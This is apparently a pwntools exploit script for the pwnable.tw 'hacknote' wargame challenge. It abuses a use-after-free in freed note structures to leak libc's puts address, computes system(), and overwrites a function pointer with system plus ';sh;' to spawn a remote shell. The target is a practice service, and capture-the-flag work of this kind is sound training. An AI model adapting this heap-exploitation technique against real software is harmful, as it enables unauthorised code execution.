from pwn import *

context(terminal=['tmux', 'new-window'])
context.log_level = 'DEBUG'


if len(sys.argv) > 2 and sys.argv[1] == 'debug':
        p = gdb.debug('./hacknote', 
     '''
        b *0x08048868
        commands
            x/70gx 0x0804b110
            silent
        end
        b *0x08048731
        commands
            x/70gx 0x0804b110
            silent
        end
        b *0x0804878e
        commands
            x/70gx 0x0804b110
            silent
        end
        b *0x0804869f
        commands
            x/70gx 0x0804b110
            silent
        end
        b *0x0804887e
        commands
            x/70gx 0x0804b110
            silent
        end
      ''')

elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = gdb.debug('./hacknote')
else:
    #p = process('./hacknote')
    p = remote('chall.pwnable.tw', 10102)

def deleteNote(index):
    p.recvuntil("Your choice :")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(index)

def printNote(index):
    p.recvuntil("Your choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline(index)
    p.recvline()

def addNote(size, content):
    p.recvuntil("Your choice :")
    p.sendline("1")
    p.recvuntil("Note size :")
    p.sendline(size)
    p.recvuntil("Content :")
    p.sendline(content)

def addNoteFull(size, content):
    p.recvuntil("Your choice :")
    p.sendline("1")
    p.recvline()


def leakPuts():
    addNote("12", "AAAAAAA")
    addNote("50", "BBBBBBBB")

    deleteNote("0")
    deleteNote("1")

    puts_plt = p32(0x804862b)
    puts_got = p32(0x804a024)

    addNote("12", puts_plt + puts_got)
    p.recvuntil("Your choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline("0")
    return p.recvline()[:4].strip()



leaked_puts = leakPuts()

print('leaked_puts :: ' + str(hex(u32(leaked_puts))))


addNote("50", "AAAAAAA")
deleteNote("1")
deleteNote("2")
system = u32(leaked_puts)-0x00024800
addNote("8", p32(system) + ";sh;")

p.recvuntil("Your choice :")
p.sendline("3")
p.recvuntil("Index :")
p.sendline("0")



p.interactive()